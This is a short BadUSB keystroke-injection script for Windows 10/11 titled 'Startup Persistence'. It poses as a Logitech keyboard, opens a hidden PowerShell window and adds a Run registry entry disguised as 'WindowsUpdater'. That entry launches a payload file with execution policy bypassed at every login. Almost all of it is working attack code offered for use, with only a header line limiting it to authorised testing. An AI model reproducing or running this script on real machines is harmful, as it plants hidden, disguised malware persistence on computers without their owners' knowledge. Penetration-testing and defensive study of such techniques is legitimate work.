REM Title: Startup Persistence
REM Author: Community
REM Target: Windows 10/11
REM Description: Adds a payload to Windows startup for persistence
REM AUTHORIZED PENETRATION TESTING ONLY
REM
ID 046D:C31C Logitech USB Keyboard

DELAY 1500

GUI r
DELAY 600
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000

REM Adds a script to run at startup via registry
REM Change payload path to your actual payload
STRING $payload = "C:\Windows\Temp\payload.bat"; $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; New-ItemProperty -Path $regPath -Name "WindowsUpdater" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $payload" -PropertyType String -Force; Write-Output "Persistence added"
ENTER
DELAY 2000
